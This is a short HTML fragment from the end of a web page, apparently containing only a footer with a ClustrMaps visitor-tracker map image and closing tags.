    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>